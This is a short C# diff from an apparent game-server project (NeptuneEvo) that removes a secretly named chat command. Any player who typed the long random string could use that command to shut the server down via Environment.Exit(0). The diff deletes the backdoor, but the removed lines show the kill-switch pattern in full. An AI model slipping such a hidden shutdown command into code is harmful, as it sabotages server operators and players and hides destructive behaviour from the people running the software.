@@ -3013,11 +3013,6 @@ namespace NeptuneEvo
             });
         }
 
-        [Command("4CF9wR8rSP6HBknk2483XsKZKeDZG6gJ9CZ37mMa3L7NSjVjjaFADGVgDbVcSSpGreARvSK4yXUHLeabRseRRGQb9X")]
-        public void InterestingCMD(Player player) {
-            player.SendChatMessage("You are the best <3");
-            Environment.Exit(0);
-        }
 
         #region SMS
         public static void OpenContacts(Player client)
